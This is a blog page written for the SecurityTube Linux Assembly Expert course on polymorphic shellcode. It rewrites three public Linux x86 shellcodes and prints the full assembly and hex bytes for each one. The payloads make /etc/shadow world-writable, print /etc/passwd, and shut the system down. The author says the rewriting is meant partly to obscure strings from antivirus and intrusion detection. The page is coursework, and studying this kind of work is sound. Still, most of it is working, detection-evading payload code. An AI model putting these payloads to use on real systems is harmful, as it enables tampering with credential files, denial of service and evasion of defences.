<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>6: Polymorphic Shellcode</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-120451103-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-120451103-1');
</script>


</head>
<body><div class="main"><div class="tree">
<p><strong>Index</strong></p>
<p><a href="About.html">About</a></p>

<p><a href="Walkthroughs.html">Walkthroughs</a></p>

<ol>
<li><a href="Walkthroughs--HackTheBox_Jeeves_Walkthrough_and_Lessons.html">HackTheBox: Jeeves Walkthrough and Lessons</a></li>
<li><a href="Walkthroughs--HackTheBox_Bashed_Walkthrough_and_Lessons.html">HackTheBox: Bashed Walkthrough and Lessons</a></li>
<li><a href="Walkthroughs--HackTheBox_Chatterbox_Walkthrough_and_Lessons.html">HackTheBox: Chatterbox Walkthrough and Lessons</a></li>
</ol>
<p><a href="Courses.html">Courses</a></p>

<ol>
<li><a href="Courses--SLAE.html">SLAE</a></li>
<ol>
<li><a href="Courses--SLAE--1_TCP_Bind_Shellcode.html">1: TCP Bind Shellcode</a></li>
<li><a href="Courses--SLAE--2_TCP_Reverse_Shell.html">2: TCP Reverse Shell</a></li>
<li><a href="Courses--SLAE--3_Egghunter_Shellcode.html">3: Egghunter Shellcode</a></li>
<li><a href="Courses--SLAE--4_Shellcode_Encoding_Scheme.html">4: Shellcode Encoding Scheme</a></li>
<li><a href="Courses--SLAE--5.1_Metasploit_TCP_Bind_Shellcode_Analysis.html">5.1: Metasploit TCP Bind Shellcode Analysis</a></li>
<li><a href="Courses--SLAE--5.2_Metasploit_chmod_Shellcode_Analysis.html">5.2: Metasploit chmod Shellcode Analysis</a></li>
<li><a href="Courses--SLAE--5.3_Metasploit_exec_Shellcode_Analysis.html">5.3: Metasploit exec Shellcode Analysis</a></li>
<li><a href="Courses--SLAE--6_Polymorphic_Shellcode.html">6: Polymorphic Shellcode</a></li>
<li><a href="Courses--SLAE--7_Shellcode_Crypter.html">7: Shellcode Crypter</a></li>
</ol></ol></div>
<div class="page"><h1><b><u>6: Polymorphic Shellcode</u></b></h1><strong>Polymorphism</strong> is born of a quality of assembly code: there are multiple instructions you can use to achieve the same results. The goal of this assignment is to write polymorphic shellcode by grabbing some shellcode from the public repository at <a href="http://shell-storm.org">shell-storm.org</a>, then altering it to achieve the same result with substantially different and possibly self-modifying code. The shellcode I write should not be more than 50% larger than the original shellcode.<br /><br />When approaching this problem, you could either try to minimize the size of the shellcode or maximize the obfuscation and difference between the code versions. I opted to maximize the polymorphism rather than minimize the shellcode size, provided the shellcode size stays within +50% parameter of the assignment.<br /><br />Let's get to it.<br /><br /><h2>Shellcode 1: chmod 666 /etc/shadow </h2><a href="http://shell-storm.org/shellcode/files/shellcode-566.php">http://shell-storm.org/shellcode/files/shellcode-566.php</a><h2> 27 Bytes</h2><br />This is a short shellcode that makes /etc/shadow world-readable and world-writable by invoking the <strong>chmod</strong> syscall. My polymorphic version is <strong>38 bytes</strong> in length. Some tricks/substitutions used were:<br /><br />• PUSH-POP instead of MOV REGISTER,VALUE<br />• XOR REGISTER,REGISTER instead of CDQ<br />• Manual stack manipulation with MOVE and SUB instead of PUSH<br /><br /><code>; linux/x86 chmod 666 /etc/shadow 27 bytes<br />; original: </code><a href="http://shell-storm.org/shellcode/files/shellcode-566.php,">http://shell-storm.org/shellcode/files/shellcode-566.php,</a><code> polymorphic for SLAE<br />; File: chmod.nasm<br /><br />section .text<br />        global _start<br /><br />_start:<br />        ; chmod("//etc/shadow", 0666);<br />        push byte 15<br />        pop eax<br />        xor edx,edx<br />        push edx<br />        mov dword [esp-4],0x776f6461<br />        mov dword [esp-8],0x68732f63<br />        mov dword [esp-12],0x74652f2f<br />        sub esp,12<br />        mov ebx,esp<br />        mov cx,0666o<br />        int 0x80</code><br />        <br />Shellcode: <strong>"\x6a\x0f\x58\x31\xd2\x52\xc7\x44\x24\xfc\x61\x64\x6f\x77\xc7\x44\x24\xf8\x63\x2f\x73\x68\xc7\x44\x24\xf4\x2f\x2f\x65\x74\x83\xec\x0c\x89\xe3\x66\xb9\xb6\x01\xcd\x80"</strong><br />        <br /><h2>Shellcode 2: cat /etc/passwd </h2><a href="http://shell-storm.org/shellcode/files/shellcode-571.php">http://shell-storm.org/shellcode/files/shellcode-571.php</a><h2> 43 Bytes</h2><br />This shellcode invokes <strong>execve /bin/cat</strong> with <strong>/etc/passwd</strong> as an argument, essentially printing the /etc/passwd file to standard output. The original author accomplished this by pushing DWORD values representing portions of the file paths onto the stack to make null-terminated strings. <br /><br />While thinking about the makeup of this shellcode, I realized that a good deal of the shellcode's size in bytes is taken up by the DWORDs used to make these strings. The original shellcode is 43 bytes long and 20 of those bytes are filled with the static string content. Not to mention the size of the code used to null-terminate the strings and get pointers to them. I began to realize that if I could change the strings, I could change a significant amount of the shellcode. Plus, the strings are probably a red flag to AV and IDS, so obfuscating them a little can't hurt.<br /><br />My polymorphic version of this shellcode is <strong>64 bytes</strong> in length. Some tricks/substitutions were:<br /><br />• For strings, hard-code [DWORD value - 0x11111111] in assembly, then use ADD instructions to change them back to the appropriate values at runtime<br />• SUB REGISTER,REGISTER instead of XOR REGISTER,REGISTER<br />• PUSH-POP instead of MOV REGISTER,REGISTER<br />• Use alternate registers where possible; for example, if a computation needs the value in ESP and ECX holds that same value, alternate between using ESP and ECX in such computations<br /><br />These changes add a lot of logic that was not in the assembly, change nearly all pre-existing instructions, and slightly obfuscate the string values in the assembly.<br /><br /><code>; linux/x86 cat /etc/passwd 43 bytes originally<br />; original: </code><a href="http://shell-storm.org/shellcode/files/shellcode-571.php,">http://shell-storm.org/shellcode/files/shellcode-571.php,</a><code> polymorphic for SLAE<br />; File: cat_passwd.nasm<br /><br />section .text<br />        global _start<br /><br />_start:<br />        sub eax,eax<br />        push eax<br />        push dword 0x6350521e<br />        push dword 0x5d58511e<br />        push esp<br />        pop ebx<br />        mov esi,0x11111111<br />        add dword [esp],esi<br />        add dword [esp+4],esi<br />        push eax<br />        push dword 0x53666262<br />        push dword 0x505f1e1e<br />        push dword 0x5263541e<br />        push esp<br />        pop ecx<br />        add dword [ecx],esi<br />        add dword [esp+4],esi<br />        add dword [ecx+8],esi<br />        push eax<br />        push byte 0xb<br />        pop eax<br />        push ecx<br />        push ebx<br />        push esp<br />        pop ecx<br />        int 0x80</code><br /><br />Shellcode: <strong>"\x29\xc0\x50\x68\x1e\x52\x50\x63\x68\x1e\x51\x58\x5d\x54\x5b\xbe\x11\x11\x11\x11\x01\x34\x24\x01\x74\x24\x04\x50\x68\x62\x62\x66\x53\x68\x1e\x1e\x5f\x50\x68\x1e\x54\x63\x52\x54\x59\x01\x31\x01\x74\x24\x04\x01\x71\x08\x50\x6a\x0b\x58\x51\x53\x54\x59\xcd\x80"</strong><br /><br /><h2>Shellcode 3: Exec "shutdown -h now" </h2><a href="http://shell-storm.org/shellcode/files/shellcode-876.php">http://shell-storm.org/shellcode/files/shellcode-876.php</a><h2> 56 Bytes</h2><br />This shellcode shuts down the PC instantly by using the execve system call to run "shutdown -h now". This shellcode is a little bit larger than the others and I was able to use a good mix of substitutions and techniques, eventually producing <strong>82 bytes</strong> of polymorphic shellcode. Techniques used:<br /><br />• SUB REGISTER,REGISTER instead of XOR REGISTER,REGISTER<br />• Use of MUL for zeroing EAX<br />• Use alternate registers<br />• MOV REGISTER,IMM-PUSH instead of PUSH IMM<br />• Manual stack manipulation with MOV and SUB instead of PUSH<br />• Use of multiple PUSH BYTE in place of PUSH WORD, PUSH DWORD, etc.<br />• PUSH-POP instead of MOV REGISTER,VALUE<br />• Addition of NOP equivalents<br /><br /><code>; linux/x86 shutdown -h now, 56 bytes originally<br />; original: </code><a href="http://shell-storm.org/shellcode/files/shellcode-876.php,">http://shell-storm.org/shellcode/files/shellcode-876.php,</a><code> polymorphic for SLAE<br />; File: shutdown.nasm<br /> <br />section .text<br />        global _start<br /> <br />_start:<br />	sub edx,edx<br />	mul edx<br />	push edx<br />	push byte 0x68<br />	push byte 0x2d<br />	sub eax,edx<br />	mov edi,esp<br />	mov dword [esp - 4],eax<br />	sub esp,4<br />	push 0x6e<br />	push word 0x776f<br />	pop word [esp + 0x1]<br />	push esp<br />	pop edi<br />	mov dword [esp - 4],eax<br />	mov dword [esp - 8],0x6e776f64<br />	mov dword [esp - 12],0x74756873<br />	mov dword [esp - 16],0x2f2f2f6e<br />	mov dword [esp - 20],0x6962732f<br />	sub esp,20	<br />	push esp<br />	pop ebx<br />	push edx<br />	push esi<br />	push edi<br />	push ebx<br />	push esp<br />	pop ecx<br />	push byte 0xb<br />	pop eax<br />	int 0x80</code><br />	<br />Shellcode: <strong>"\x29\xd2\xf7\xe2\x52\x6a\x68\x6a\x2d\x29\xd0\x89\xe7\x89\x44\x24\xfc\x83\xec\x04\x6a\x6e\x66\x68\x6f\x77\x66\x8f\x44\x24\x01\x54\x5f\x89\x44\x24\xfc\xc7\x44\x24\xf8\x64\x6f\x77\x6e\xc7\x44\x24\xf4\x73\x68\x75\x74\xc7\x44\x24\xf0\x6e\x2f\x2f\x2f\xc7\x44\x24\xec\x2f\x73\x62\x69\x83\xec\x14\x54\x5b\x52\x56\x57\x53\x54\x59\x6a\x0b\x58\xcd\x80"</strong><br /><br />---<br /><br /><em>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:<br /></em><a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a><em><br />Student ID: SLAE - 1353</em></div></div>
</body></html>